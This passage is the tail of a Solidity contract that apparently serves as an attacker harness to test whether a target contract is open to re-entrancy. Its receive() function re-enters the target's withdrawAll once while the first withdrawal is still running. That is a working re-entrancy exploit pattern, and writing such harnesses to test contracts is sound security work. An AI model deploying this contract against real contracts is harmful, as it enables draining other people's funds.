    function doWithdraw() external {
        // call withdrawAll on behalf of this contract
        target.withdrawAll();
    }

    // on receiving Ether, attempt re-entrancy once
    receive() external payable {
        if (!reentered) {
            reentered = true;
            // re-enter withdrawAll while original withdrawAll still in progress if target is vulnerable
            // wrap in try/catch to avoid bubbling reverts here
            try target.withdrawAll() {
            } catch {}
        }
    }
}

